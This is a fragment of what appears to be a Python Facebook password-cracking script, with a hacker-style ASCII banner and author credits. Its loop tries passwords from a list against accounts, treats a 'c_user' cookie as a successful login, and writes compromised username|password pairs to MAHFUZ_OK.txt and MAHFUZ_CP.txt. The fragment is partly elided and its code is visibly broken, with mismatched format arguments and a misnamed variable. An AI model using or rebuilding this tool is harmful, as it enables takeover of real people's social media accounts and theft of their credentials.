...
$$ |\$  /$$ |$$  __$$ |$$ |  $$ |$$ |      $$ |  $$ | $$  _/   
$$ | \_/ $$ |\$$$$$$$ |$$ |  $$ |$$ |      \$$$$$$  |$$$$$$$$\ 
\__|     \__| \_______|\__|  \__|\__|       \______/ \________|
   \033[1;37m
   \033[1;37m
   \033[1;37m  
   \033[1;37m   
   ...
   \033[1;37m 
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Mahfuz Hasan 
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Md Mahfuz Hasan 
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           MAHFUZ-55
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mMAHFUZ_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mMAHFUZ_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back MAHFUZ Menu ")
	    sarfraz()
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MAHFUZ-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MAHFUZ_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [MAHFUZ-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MAHFUZ_CP.txt' , 'a').write('%s\n' % wrt)
                        break
